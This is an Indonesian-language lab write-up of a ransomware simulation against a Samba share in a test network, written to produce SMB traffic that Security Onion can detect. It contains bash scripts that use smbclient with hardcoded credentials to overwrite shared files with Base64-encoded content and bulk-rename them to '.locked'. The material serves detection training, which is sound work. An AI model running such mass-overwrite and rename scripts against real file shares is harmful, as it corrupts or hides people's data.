# Langkah 4 — Simulasi Bulk Encryption



## Tujuan



Tahap ini bertujuan mensimulasikan perilaku ransomware yang melakukan enkripsi massal terhadap file pada shared folder Samba. Dalam simulasi ini digunakan metode encoding Base64 sebagai representasi sederhana proses enkripsi. Meskipun bukan algoritma kriptografi yang kuat, metode ini cukup untuk menunjukkan perubahan isi file, hilangnya keterbacaan data, serta menghasilkan aktivitas SMB yang dapat dideteksi oleh sistem monitoring.



---



### Tahap 4.1 — Persiapan Dataset



Sebelum simulasi dilakukan, beberapa file pada shared folder dikembalikan ke kondisi normal dengan isi berupa teks yang mudah dikenali. Hal ini bertujuan agar perubahan akibat proses enkripsi dapat terlihat dengan jelas.



File dummy dibuat pada mesin Kali Linux:



```bash

echo "Dokumen penting perusahaan 1" > doc1.txt

echo "Dokumen penting perusahaan 2" > doc2.txt

echo "Dokumen penting perusahaan 3" > doc3.txt

```



Kemudian file diunggah ke SMB share menggunakan akun `user1`:



```bash

smbclient //192.168.4.5/restricted -U user1

```



```text

put doc1.txt file1.txt

put doc2.txt file2.txt

put doc3.txt file3.txt

```



Verifikasi dilakukan dengan mengunduh kembali file tersebut:



```text

get file1.txt verify1.txt

get file2.txt verify2.txt

get file3.txt verify3.txt

```



Hasil verifikasi menunjukkan bahwa file masih berisi data asli:



```text

Dokumen penting perusahaan 1

Dokumen penting perusahaan 2

Dokumen penting perusahaan 3

```



Kondisi ini menjadi baseline sebelum simulasi enkripsi dilakukan.



---



### Tahap 4.2 — Pembuatan Script Enkripsi Sederhana



Script dibuat untuk melakukan proses berikut secara otomatis:



1. Mengunduh file dari SMB share.

2. Mengubah isi file menjadi format Base64.

3. Mengunggah kembali hasil encoding ke file yang sama.



Script yang digunakan:



```bash

\#!/bin/bash



for i in {1..10}

do

&#x20;   smbclient //192.168.4.5/restricted \\

&#x20;   -U user1%user1 \\

&#x20;   -c "get file${i}.txt temp.txt"



&#x20;   base64 temp.txt > encrypted.txt



&#x20;   smbclient //192.168.4.5/restricted \\

&#x20;   -U user1%user1 \\

&#x20;   -c "put encrypted.txt file${i}.txt"

done



rm -f temp.txt encrypted.txt

```



Script tersebut mensimulasikan perilaku ransomware yang membaca file korban, memodifikasi isinya, kemudian menuliskan kembali hasil perubahan ke lokasi yang sama. simulasi enkripsi menggunakan Base64 sebagai representasi sederhana proses ransomware, bukan algoritma enkripsi yang sesungguhnya.



---



### Tahap 4.3 — Simulasi Bulk Encryption



Script dijalankan dari mesin Kali Linux:



```bash

chmod +x encrypt\_files.sh

./encrypt\_files.sh

```



Output menunjukkan bahwa setiap file berhasil dibaca dari SMB share dan ditulis ulang setelah proses encoding.



Contoh aktivitas yang muncul:



```text

getting file \\file1.txt of size 29 as temp.txt

putting file encrypted.txt as \\file1.txt



getting file \\file2.txt of size 29 as temp.txt

putting file encrypted.txt as \\file2.txt

```



Proses tersebut berlangsung untuk seluruh file target dalam direktori `restricted`.



---



### Tahap 4.4 — Verifikasi Hasil Enkripsi



Untuk memastikan isi file telah berubah, salah satu file diunduh kembali dari SMB share.



```text

get file1.txt encrypted\_verify.txt

```



Hasil pemeriksaan:



```text

RG9rdW1lbiBwZW50aW5nIHBlcnVzYWhhYW4gMQo=

```



Sebelum simulasi:



```text

Dokumen penting perusahaan 1

```



Sesudah simulasi:



```text

RG9rdW1lbiBwZW50aW5nIHBlcnVzYWhhYW4gMQo=

```



Hasil tersebut menunjukkan bahwa data asli tidak lagi dapat dibaca secara langsung oleh pengguna.



---



### Tahap 4.5 — Simulasi Bulk Rename (Locked Files)



Sebagai perilaku tambahan yang umum ditemukan pada ransomware, seluruh file yang telah dimodifikasi kemudian diubah ekstensinya menjadi `.locked`.



Script yang digunakan:



```bash

\#!/bin/bash



for i in {1..10}

do

&#x20;   smbclient //192.168.4.5/restricted \\

&#x20;   -U user1%user1 \\

&#x20;   -c "rename file${i}.txt file${i}.locked"

done

```



Script dijalankan menggunakan:



```bash

chmod +x rename\_locked.sh

./rename\_locked.sh

```



Tahap ini mensimulasikan ransomware yang menandai file korban sebagai file yang telah terenkripsi.



---



### Tahap 4.6 — Verifikasi Rename



Verifikasi dilakukan menggunakan SMB client.



```text

ls

```



Hasil menunjukkan bahwa seluruh file telah berubah nama:



```text

file1.locked

file2.locked

file3.locked

...

file10.locked

```



Tidak ditemukan lagi file dengan ekstensi `.txt` yang menjadi target simulasi.



---



### Tahap 4.7 — Verifikasi pada Server



Pemeriksaan langsung pada Ubuntu Samba Server menunjukkan bahwa file yang tersimpan memang telah berubah.



Contoh hasil pemeriksaan:



```bash

ls -lsh /srv/samba/share/restricted/

```



Terlihat file:



```text

file1.locked

file2.locked

...

file10.locked

```



Isi salah satu file juga menunjukkan hasil encoding:



```bash

cat /srv/samba/share/restricted/file1.locked

```



Output:



```text

RG9rdW1lbiBwZW50aW5nIHBlcnVzYWhhYW4gMSw=

```



Hal ini membuktikan bahwa perubahan tidak hanya terjadi pada sisi klien, tetapi benar-benar tersimpan pada server Samba.



\---



\### Tahap 4.8 — Evidence Monitoring



Selama simulasi berlangsung, Security Onion melakukan monitoring terhadap trafik jaringan antara Kali Linux (192.168.4.100) dan Samba Server (192.168.4.5).



Monitoring menunjukkan aktivitas SMB yang intensif pada port 445, berupa:



\* Pembacaan file (SMB Read)

\* Penulisan ulang file (SMB Write)

\* Perubahan nama file (SMB Rename)

\* Pembukaan dan penutupan sesi SMB secara berulang



Contoh log yang terdeteksi:



```text

192.168.4.100 > 192.168.4.5.microsoft-ds

192.168.4.5.microsoft-ds > 192.168.4.100

```



Pola komunikasi tersebut menunjukkan adanya aktivitas massal terhadap file share yang konsisten dengan perilaku ransomware.



\---



\### Hasil Simulasi



Simulasi berhasil menunjukkan perilaku dasar ransomware terhadap shared folder Samba, yaitu:



1\. Membaca file melalui SMB.

2\. Memodifikasi isi file secara massal.

3\. Mengubah data asli menjadi bentuk yang tidak mudah dibaca.

4\. Mengganti nama file menggunakan ekstensi `.locked`.

5\. Menghasilkan lonjakan aktivitas SMB yang dapat diamati melalui Security Onion.



Bukti pada sisi klien, server, dan sistem monitoring menunjukkan bahwa seluruh tahapan simulasi berhasil dijalankan sesuai skenario yang direncanakan.



